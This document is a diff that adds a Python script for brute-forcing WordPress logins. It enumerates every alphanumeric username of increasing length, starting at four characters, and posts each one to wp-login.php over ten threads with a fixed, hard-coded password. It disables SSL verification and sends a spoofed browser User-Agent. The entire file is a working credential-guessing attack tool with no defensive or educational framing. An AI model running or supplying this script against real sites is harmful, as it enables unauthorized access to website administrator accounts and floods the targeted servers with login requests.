@@ -1,0 +1,82 @@
+import requests
+import itertools
+import string
+import concurrent.futures
+
+# Function to login with custom username and password
+def login_to_admin_page(username, password):
+    urls = [
+        'https://example.com/wp-login.php',  # HTTPS login URL
+        'http://example.com/wp-login.php'    # HTTP login URL
+    ]
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9'
+    }
+
+    login_data = {
+        'log': username,
+        'pwd': password,
+        'wp-submit': 'Log In',
+        'redirect_to': '/wp-admin',
+        'testcookie': '1'
+    }
+
+    for url in urls:
+        print(f"Trying to login via {url} with username: {username}...")
+
+        try:
+            # Disable SSL verification for HTTPS (if needed)
+            response = requests.post(url, headers=headers, data=login_data, verify=False)
+
+            if response.status_code == 200:
+                print(f"Successfully submitted login form to {url}")
+                if "Dashboard" in response.text:  # Adjust based on actual success message
+                    print(f"Login successful at {url} with username: {username}")
+                    return True  # Successful login
+                else:
+                    print(f"Login failed at {url} with username: {username}, check your credentials.")
+            else:
+                print(f"Failed to submit login form to {url}, Status Code: {response.status_code}")
+
+        except requests.exceptions.SSLError as ssl_error:
+            print(f"SSL error occurred when trying {url}: {ssl_error}")
+
+    return False  # Login attempt failed
+
+# Function to try all possible combinations of usernames of increasing length using multithreading
+def try_all_usernames(password):
+    characters = string.ascii_letters + string.digits  # Set of characters: a-z, A-Z, 0-9
+    length = 4  # Start with length 4
+
+    while True:
+        print(f"Testing usernames of length {length}...")
+
+        # Generate all possible combinations for the current length
+        username_combinations = itertools.product(characters, repeat=length)
+
+        # Use a thread pool to test multiple usernames at once
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            futures = {executor.submit(login_to_admin_page, ''.join(username), password): username for username in username_combinations}
+
+            # Check for successful login
+            for future in concurrent.futures.as_completed(futures):
+                username = ''.join(futures[future])
+                try:
+                    if future.result():
+                        print(f"Success! The working username is: {username}")
+                        executor.shutdown(wait=False)  # Stop further processing when successful
+                        return  # Exit the function once the login is successful
+                except Exception as exc:
+                    print(f"{username} generated an exception: {exc}")
+
+        # If no success, increase the username length and try again
+        print(f"All attempts failed with username length {length}. Increasing length to {length + 1}.")
+        length += 1
+
+# Example usage
+password = 'a8cYEr&8npdofEn%$WQucGxe'  # Provided password
+try_all_usernames(password)
